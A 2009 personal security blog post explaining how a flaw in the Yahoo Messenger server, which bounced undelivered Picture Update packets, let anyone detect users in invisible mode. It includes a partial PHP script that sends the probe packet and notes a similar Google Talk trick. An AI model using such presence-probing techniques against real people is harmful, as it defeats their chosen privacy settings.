---
id: 169
title: 'Analysing Yahoo Messenger Protocol (YMSG) &#8211; Detecting Invisible Mode'
date: '2009-06-20T12:13:00+00:00'
author: Kiran
guid: 'https://kiran.co/analysing-yahoo-messenger-protocol-ymsg-detecting-invisible-mode/'
permalink: /2009/06/analysing-yahoo-messenger-protocol-ymsg-detecting-invisible-mode/
blogger_blog:
    - musemewithcoffee.blogspot.com
blogger_author:
    - 'Kiran (a.k.a. ThePhoenics)'
blogger_permalink:
    - /2009/06/analysing-yahoo-messenger-protocol-ymsg.html
'Hide SexyBookmarks':
    - '0'
'Hide OgTags':
    - '0'
image:
    - ''
quote-author:
    - Unknown
quote-url:
    - 'http://'
quote-copy:
    - Unknown
audio:
    - 'http://'
link-url:
    - 'http://'
categories:
    - Security
---

<div align="justify">This is a work I have done an year ago. I guess I first analysed the YMSG protocol and its registry about 7 years back. I had released a document on the security bugs in the system in a document named ‘Yahoo Registry Opened Up’ and published it on Astalavista. Time went by and I have lost the document. If only there were blogs back then.So, I had created a website for detecting invisible users on Yahoo –  
<http://mailhax.com/ym/>So, now to start with how it works. The key packet to this trick is the Picture Update packet, which is unfortunately, handled wrongly by the Yahoo Messenger server. First, let me show you the code of the script I use.

```

include_once('class.YMSG.php');

include_once("class.ClientSocket.php");

$debug = $_REQUEST['debug'];

$image_path = '';
$status_code = '';
$status_string = '';

class TestMessenger {
private $msgr;
private $pic_loop_back = false;
private $test_id;

function GetStatus() {
  $sc = new ClientSocket();
  $sc->open('opi.yahoo.com',80);
  $sc->send('GET /online?u='.$this->test_id.'&m=t&t=1'."\r\n");
  $status = $sc->recv();
  $sc->close();
  if ($status=='00') return false;
  else return true;
}

function __construct($msgr = null) {
  $this->test_id = 'thephoenics';
  if ($_REQUEST['id']) $this->test_id = $_REQUEST['id'];
  if ($msgr) $this->msgr = $msgr;
}

function SetMsgr($msgr) {
  if ($msgr) $this->msgr = $msgr;
}

function handleConnected() {
  $this->msgr->log("--- Connected. Login in progress");
  $this->msgr->login("Username","Password");
  $this->msgr->log("--- Login Requested");
}

function handleAuthenticated() {
  $this->msgr->log("--- Authentication Successful");
  $this->msgr->log("--- Sending Picture Update");
  $this->msgr->send_picture_update($this->test_id);
  //$this->msgr->send_sms();
}

function handlePictureUpdate() {
  global $image_path, $status_string, $status_code;
  $this->pic_loop_back = true;
  $this->msgr->log("--- {$this->test_id} is Offline ");
  $this->msgr->terminated = true;
  $image_path .= "offline.jpg";
  $status_code = '0';
  $status_string = 'offline';
}

function handleTerminated() {
  global $image_path, $status_string, $status_code;
  if (!$this->pic_loop_back) {
      $this->msgr->log("--- {$this->test_id} is Online ");
      $image_path .= "invisible.jpg";
      $status_code = "2";
      $status_string = "invisible";
      }
}

function handleHeartBeat() {
  $this->msgr->log("--- Dhak Dhak");
}

function handleAuthFailure() {
  $this->msgr->log("--- Authentication Failure");
}
}
```

The above script is based on the event based yahoo messenger script I wrote in php (however, I handled the authentication by create an executable, by compiling a C code sniplet I extracted from Pidgin source code). I planned to release it online, but, well… I was not in a mood to do that later (okay, I admit, I just got lazy as always :P).

Soo, what do we see here. We send the Picture Update packet – well, I will describe its structure elsewhere… or you could use Wireshark and sniff your packets. Use my site to find if you are online, you will get a Picture Update packet from my bot. That will be a good method.

What does the server do? Hint – it bounces the packet back to you if it fails to deliver it!  
Wow, so, no matter which messenger service you use, it doesn’t matter. The flaw is in the Yahoo Messenger server itself. So, we wait for the bounced packets, for two heart beats. If one does not get a bounced packet by then, the person is invisible – cause it got delivered successfully.

So, thats quite interesting isnt it?

A similar thing is valid for google talk too. Wow, isn’t that cool? Just select “Go off the record” and send the person a message. If he is not online, you get a humble message saying it was not delivered. Else, you dont get it – google never lies – it prefers keeping quiet. But at the risk of the poor guy’s privacy. Hey people, its fair enough to say “The message may not be delivered since the user appears to be offline !!!”. So, please do that !

So, thats the secret behind that thing dude. And yeah, if anyone wants the PHP class for YMSG, just send me a comment or mail… or may be if I get a lil less lazy one of these days, I may release it too (adding sufficient comments).

Have fun.

</div>